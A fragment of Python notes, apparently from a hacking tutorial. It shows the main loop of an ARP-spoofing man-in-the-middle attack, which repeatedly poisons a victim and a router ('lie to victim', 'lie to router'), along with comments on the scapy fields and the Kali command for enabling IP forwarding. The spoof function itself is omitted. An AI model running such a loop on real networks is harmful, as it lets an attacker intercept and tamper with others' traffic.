...
try:
	...
	while True:
		spoof(target_ip, gateway_ip) #lie to victim
		spoof(gateway_ip, target_ip) #lie to router
...
#psrc = ip address
#hwsrc = mac address
#in kali to forward packets like a router: echo 1 > /proc/sys/net/ipv4/ip_forward